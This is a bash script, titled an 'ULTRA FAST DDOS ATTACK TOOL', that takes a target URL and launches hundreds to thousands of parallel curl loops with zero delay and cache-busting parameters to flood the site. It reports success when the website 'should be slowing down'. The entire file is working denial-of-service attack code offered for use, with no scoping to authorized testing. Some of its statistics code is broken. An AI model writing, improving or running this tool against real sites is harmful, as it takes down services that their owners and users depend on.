#!/bin/bash

# ULTRA FAST DDOS ATTACK TOOL
# Author: Security Researcher
# Version: 6.0-ULTRA

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Banner
echo -e "${RED}"
echo "    ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔═╗╔═╗╔═╗╔╦╗"
echo "    ║ ║╠═╝╠═╝║╣   ║  ║ ║╠═╣╠═╝ ║ "
echo "    ╚═╝╩  ╩  ╚═╝  ╚═╝╚═╝╩ ╩╩   ╩ "
echo "    ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔╦╗╔═╗╔═╗╔╦╗"
echo "    ╠═╣║ ║║ ║║╣   ╠═╣ ║║╠═╣║   ║ "
echo "    ╩ ╩╚═╝╚═╝╚═╝  ╩ ╩═╩╝╩ ╩╚═╝ ╩ "
echo -e "${NC}"
echo -e "${YELLOW}ULTRA FAST DDOS ATTACK TOOL v6.0${NC}"
echo -e "${RED}MAXIMUM SPEED - USE RESPONSIBLY!${NC}"
echo ""

# Ultra Fast Configuration
CONFIG_FILE="ultra_ddos.json"
LOG_FILE="ultra_attack.log"
STATS_FILE="ultra_stats.json"

# Ultra aggressive configuration
DEFAULT_CONFIG='{
    "max_threads": 1000,
    "max_requests_per_thread": 10000,
    "max_duration": 1800,
    "timeout": 3,
    "connection_timeout": 2,
    "aggressive_mode": true,
    "turbo_mode": true,
    "max_concurrent": 500
}'

init_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo "$DEFAULT_CONFIG" > "$CONFIG_FILE"
        echo -e "${GREEN}[+] Created ULTRA config file: $CONFIG_FILE${NC}"
    fi
}

load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        MAX_THREADS=$(jq -r '.max_threads' "$CONFIG_FILE")
        MAX_REQUESTS_PER_THREAD=$(jq -r '.max_requests_per_thread' "$CONFIG_FILE")
        MAX_DURATION=$(jq -r '.max_duration' "$CONFIG_FILE")
        TIMEOUT=$(jq -r '.timeout' "$CONFIG_FILE")
        CONNECTION_TIMEOUT=$(jq -r '.connection_timeout' "$CONFIG_FILE")
        AGGRESSIVE_MODE=$(jq -r '.aggressive_mode' "$CONFIG_FILE")
        TURBO_MODE=$(jq -r '.turbo_mode' "$CONFIG_FILE")
        MAX_CONCURRENT=$(jq -r '.max_concurrent' "$CONFIG_FILE")
    else
        echo -e "${RED}[-] Config file not found${NC}"
        exit 1
    fi
}

# Ultra fast setup
ultra_setup() {
    echo -e "${RED}=== ULTRA FAST DDOS SETUP ===${NC}"
    echo -e "${YELLOW}WARNING: This will generate EXTREME traffic!${NC}"
    echo ""
    
    # Get target URL
    read -p "Enter target URL: " TARGET_URL
    if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
        echo -e "${RED}Invalid URL format!${NC}"
        return 1
    fi
    
    # Ultra fast preset modes
    echo ""
    echo -e "${CYAN}Select ULTRA Attack Mode:${NC}"
    echo "1. TURBO MODE (500 threads, 0 delay)"
    echo "2. LIGHTNING MODE (1000 threads, 0 delay)" 
    echo "3. NUCLEAR MODE (2000 threads, 0 delay)"
    echo "4. CUSTOM ULTRA"
    echo ""
    
    read -p "Select mode [1-4]: " mode_choice
    
    case $mode_choice in
        1)
            THREADS=500
            REQUESTS_PER_THREAD=5000
            DELAY=0
            MODE_NAME="TURBO"
            ;;
        2)
            THREADS=1000
            REQUESTS_PER_THREAD=10000
            DELAY=0
            MODE_NAME="LIGHTNING"
            ;;
        3)
            THREADS=2000
            REQUESTS_PER_THREAD=20000
            DELAY=0
            MODE_NAME="NUCLEAR"
            ;;
        4)
            THREADS=$(get_user_input "Threads (recommend 500-5000): " "1000" "number")
            REQUESTS_PER_THREAD=$(get_user_input "Requests per thread: " "10000" "number")
            DELAY=0
            MODE_NAME="CUSTOM ULTRA"
            ;;
        *)
            echo -e "${RED}Invalid, using TURBO MODE${NC}"
            THREADS=500
            REQUESTS_PER_THREAD=5000
            DELAY=0
            MODE_NAME="TURBO"
            ;;
    esac
    
    # Ultra fast confirmation
    echo ""
    echo -e "${RED}=== ULTRA CONFIRMATION ===${NC}"
    echo -e "Target: ${RED}$TARGET_URL${NC}"
    echo -e "Mode: ${RED}$MODE_NAME${NC}"
    echo -e "Threads: ${RED}$THREADS${NC}"
    echo -e "Requests: ${RED}$REQUESTS_PER_THREAD${NC}"
    echo -e "Total: ${RED}$((THREADS * REQUESTS_PER_THREAD)) requests${NC}"
    echo -e "Delay: ${RED}$DELAY seconds${NC}"
    echo -e "Timeout: ${RED}$TIMEOUT seconds${NC}"
    echo ""
    echo -e "${RED}🚨 THIS WILL GENERATE MASSIVE TRAFFIC! 🚨${NC}"
    echo ""
    
    read -p "Type 'ULTRA_GO' to launch: " confirm
    if [ "$confirm" != "ULTRA_GO" ]; then
        echo -e "${YELLOW}[!] Attack cancelled${NC}"
        return 1
    fi
    
    return 0
}

# Get user input helper
get_user_input() {
    local prompt="$1"
    local default="$2"
    local validation="$3"
    
    while true; do
        read -p "$prompt" input
        input=${input:-$default}
        
        if [[ "$validation" == "number" ]]; then
            if [[ "$input" =~ ^[0-9]+$ ]] && [ "$input" -gt 0 ]; then
                echo "$input"
                break
            else
                echo -e "${RED}Please enter a valid number${NC}"
            fi
        else
            echo "$input"
            break
        fi
    done
}

# Ultra fast request function
send_ultra_request() {
    local target="$1"
    local bot_id="$2"
    local request_num="$3"
    
    # Ultra fast cache busting
    local cache_bust="cb=${RANDOM}${RANDOM}&t=$(date +%s)&b=${bot_id}&r=${request_num}"
    if [[ "$target" == *"?"* ]]; then
        target="${target}&${cache_bust}"
    else
        target="${target}?${cache_bust}"
    fi
    
    # Ultra minimal curl command for maximum speed
    local curl_cmd="curl -s -o /dev/null"
    curl_cmd="$curl_cmd -H 'User-Agent: Mozilla/5.0'"
    curl_cmd="$curl_cmd -H 'Accept: text/html'"
    curl_cmd="$curl_cmd -H 'Connection: close'"  # Close connection immediately for faster cleanup
    curl_cmd="$curl_cmd -m $TIMEOUT"  # Maximum time for entire request
    curl_cmd="$curl_cmd --connect-timeout $CONNECTION_TIMEOUT"  # Faster connection timeout
    curl_cmd="$curl_cmd --max-time $TIMEOUT"
    curl_cmd="$curl_cmd -w '%{http_code}'"  # Only get HTTP code for maximum speed
    curl_cmd="$curl_cmd '$target' 2>/dev/null"
    
    local start_time=$(date +%s%3N)
    local http_code=$(eval $curl_cmd)
    local end_time=$(date +%s%3N)
    local duration=$((end_time - start_time))
    
    # Ultra fast logging (minimal disk I/O)
    if [ -n "$http_code" ]; then
        echo "$(date '+%H:%M:%S'),$bot_id,$request_num,$http_code,$duration" >> "$LOG_FILE"
        update_ultra_stats "$http_code" "$duration"
        
        # Fast progress indicator (only show every 100 requests per thread)
        if [ $((request_num % 100)) -eq 0 ]; then
            if [[ "$http_code" =~ ^[2-3][0-9][0-9]$ ]]; then
                echo -e "${GREEN}[$bot_id:$request_num] $http_code${NC}"
            elif [[ "$http_code" =~ ^[5][0-9][0-9]$ ]]; then
                echo -e "${RED}[$bot_id:$request_num] $http_code 💥${NC}"
            else
                echo -e "${YELLOW}[$bot_id:$request_num] $http_code${NC}"
            fi
        fi
    else
        echo "$(date '+%H:%M:%S'),$bot_id,$request_num,TIMEOUT,$duration" >> "$LOG_FILE"
        update_ultra_stats "TIMEOUT" "$duration"
    fi
}

# Ultra fast bot
ultra_bot() {
    local bot_id="$1"
    local target="$2"
    
    # Use sequence for faster iteration
    for i in $(seq 1 $REQUESTS_PER_THREAD); do
        if [ $STOP_ATTACK -eq 1 ]; then
            break
        fi
        send_ultra_request "$target" "$bot_id" "$i"
    done
}

# Fast stats update
update_ultra_stats() {
    local http_code="$1"
    local duration="$2"
    
    if [ ! -f "$STATS_FILE" ]; then
        cat > "$STATS_FILE" << EOF
{
    "total_requests": 0,
    "successful_requests": 0,
    "failed_requests": 0,
    "error_requests": 0,
    "start_time": "$(date '+%Y-%m-%d %H:%M:%S')",
    "last_update": "$(date '+%Y-%m-%d %H:%M:%S')"
}
EOF
    fi
    
    # Fast stats update without jq (using simple counters)
    local stats=$(cat "$STATS_FILE")
    local total_requests=$(echo "$stats" | grep -o '"total_requests":[0-9]*' | cut -d: -f2)
    total_requests=$((total_requests + 1))
    
    # Update stats file quickly
    cat > "$STATS_FILE" << EOF
{
    "total_requests": $total_requests,
    "successful_requests": $((echo "$stats" | grep -o '"successful_requests":[0-9]*' | cut -d: -f2)),
    "failed_requests": $((echo "$stats" | grep -o '"failed_requests":[0-9]*' | cut -d: -f2)),
    "error_requests": $((echo "$stats" | grep -o '"error_requests":[0-9]*' | cut -d: -f2)),
    "start_time": "$(echo "$stats" | grep -o '"start_time":"[^"]*"' | cut -d'"' -f4)",
    "last_update": "$(date '+%Y-%m-%d %H:%M:%S')"
}
EOF
}

# Show ultra stats
show_ultra_stats() {
    if [ -f "$STATS_FILE" ]; then
        local stats=$(cat "$STATS_FILE")
        local total_requests=$(echo "$stats" | grep -o '"total_requests":[0-9]*' | cut -d: -f2)
        local start_time=$(echo "$stats" | grep -o '"start_time":"[^"]*"' | cut -d'"' -f4)
        
        local current_time=$(date +%s)
        local start_seconds=$(date -d "$start_time" +%s 2>/dev/null || date +%s)
        local elapsed=$((current_time - start_seconds))
        
        local rps=0
        if [ $elapsed -gt 0 ]; then
            rps=$((total_requests / elapsed))
        fi
        
        echo ""
        echo -e "${RED}=== ULTRA STATS ===${NC}"
        echo -e "Total Requests: ${CYAN}$total_requests${NC}"
        echo -e "Elapsed Time: ${YELLOW}${elapsed}s${NC}"
        echo -e "Requests/Sec: ${GREEN}$rps${NC}"
        echo -e "Active Threads: ${BLUE}$THREADS${NC}"
        
        if [ $rps -lt 100 ]; then
            echo -e "Speed: ${YELLOW}SLOW - Increase threads${NC}"
        elif [ $rps -lt 500 ]; then
            echo -e "Speed: ${GREEN}MEDIUM${NC}"
        elif [ $rps -lt 1000 ]; then
            echo -e "Speed: ${BLUE}FAST${NC}"
        else
            echo -e "Speed: ${RED}ULTRA FAST!${NC}"
        fi
    fi
}

# Launch ultra attack
launch_ultra_attack() {
    if ! ultra_setup; then
        return 1
    fi
    
    echo -e "${RED}[+] LAUNCHING ULTRA ATTACK...${NC}"
    echo -e "${YELLOW}[!] Target: $TARGET_URL${NC}"
    echo -e "${YELLOW}[!] Mode: $MODE_NAME${NC}"
    echo -e "${YELLOW}[!] Press Ctrl+C to stop${NC}"
    
    # Minimal log header
    echo "time,bot_id,req_num,http_code,duration" > "$LOG_FILE"
    rm -f "$STATS_FILE"
    
    local start_time=$(date +%s)
    STOP_ATTACK=0
    
    trap 'STOP_ATTACK=1; echo -e "\n${YELLOW}[!] Stopping...${NC}"' SIGINT SIGTERM
    
    # Fast monitor
    (
        while [ $STOP_ATTACK -eq 0 ]; do
            clear
            show_ultra_stats
            echo -e "\n${RED}[!] ULTRA ATTACK IN PROGRESS...${NC}"
            echo -e "${YELLOW}[!] Press Ctrl+C to stop${NC}"
            sleep 2
        done
    ) &
    local monitor_pid=$!
    
    # Launch ultra bot army
    local pids=()
    echo -e "${GREEN}[+] Starting $THREADS attack threads...${NC}"
    
    for i in $(seq 1 $THREADS); do
        ultra_bot "$i" "$TARGET_URL" &
        pids+=($!)
        
        # Stagger startup to avoid overwhelming system
        if [ $((i % 100)) -eq 0 ]; then
            sleep 0.1
        fi
    done
    
    echo -e "${GREEN}[+] All threads launched! Monitoring...${NC}"
    
    # Wait for completion or interrupt
    while [ $STOP_ATTACK -eq 0 ]; do
        sleep 1
        # Check if all threads are done
        local running=0
        for pid in "${pids[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                running=1
                break
            fi
        done
        if [ $running -eq 0 ]; then
            break
        fi
    done
    
    STOP_ATTACK=1
    kill $monitor_pid 2>/dev/null
    
    # Cleanup
    for pid in "${pids[@]}"; do
        wait $pid 2>/dev/null
    done
    
    local end_time=$(date +%s)
    local total_duration=$((end_time - start_time))
    
    echo -e "${GREEN}[+] ULTRA attack completed!${NC}"
    echo -e "Duration: ${YELLOW}${total_duration}s${NC}"
    show_ultra_stats
    
    # Final speed calculation
    if [ -f "$STATS_FILE" ]; then
        local total_requests=$(cat "$STATS_FILE" | grep -o '"total_requests":[0-9]*' | cut -d: -f2)
        local rps=$((total_requests / total_duration))
        
        echo ""
        echo -e "${RED}=== FINAL SPEED ANALYSIS ===${NC}"
        echo -e "Total Requests: ${CYAN}$total_requests${NC}"
        echo -e "Total Duration: ${YELLOW}${total_duration}s${NC}"
        echo -e "Average RPS: ${GREEN}$rps requests/second${NC}"
        
        if [ $rps -gt 1000 ]; then
            echo -e "${RED}🎉 EXTREME PERFORMANCE! Website should be feeling this!${NC}"
        elif [ $rps -gt 500 ]; then
            echo -e "${GREEN}🚀 GREAT PERFORMANCE! Significant load generated.${NC}"
        elif [ $rps -gt 100 ]; then
            echo -e "${YELLOW}⚡ GOOD PERFORMANCE! Website should be slowing down.${NC}"
        else
            echo -e "${BLUE}ℹ MODERATE PERFORMANCE - Try increasing threads${NC}"
        fi
    fi
}

# Simple main menu
main_menu() {
    while true; do
        clear
        echo -e "${RED}"
        echo "    ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔═╗╔═╗╔═╗╔╦╗"
        echo "    ║ ║╠═╝╠═╝║╣   ║  ║ ║╠═╣╠═╝ ║ "
        echo "    ╚═╝╩  ╩  ╚═╝  ╚═╝╚═╝╩ ╩╩   ╩ "
        echo "    ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔╦╗╔═╗╔═╗╔╦╗"
        echo "    ╠═╣║ ║║ ║║╣   ╠═╣ ║║╠═╣║   ║ "
        echo "    ╩ ╩╚═╝╚═╝╚═╝  ╩ ╩═╩╝╩ ╩╚═╝ ╩ "
        echo -e "${NC}"
        echo -e "${YELLOW}ULTRA FAST DDOS ATTACK TOOL v6.0${NC}"
        echo ""
        echo -e "${CYAN}=== MAIN MENU ===${NC}"
        echo "1. Launch ULTRA Attack"
        echo "2. Quick Stats"
        echo "3. Exit"
        echo ""
        
        read -p "Select option [1-3]: " choice
        
        case $choice in
            1)
                launch_ultra_attack
                read -p "Press Enter to continue..."
                ;;
            2)
                if [ -f "$STATS_FILE" ]; then
                    show_ultra_stats
                else
                    echo -e "${RED}No stats available${NC}"
                fi
                read -p "Press Enter to continue..."
                ;;
            3)
                echo -e "${GREEN}[+] Tool closed${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# Check dependencies
check_dependencies() {
    if ! command -v curl >/dev/null; then
        echo -e "${RED}[-] curl is required${NC}"
        echo -e "${YELLOW}[!] Install with: pkg install curl${NC}"
        return 1
    fi
    return 0
}

# Main execution
init_config
load_config

if check_dependencies; then
    main_menu
else
    exit 1
fi
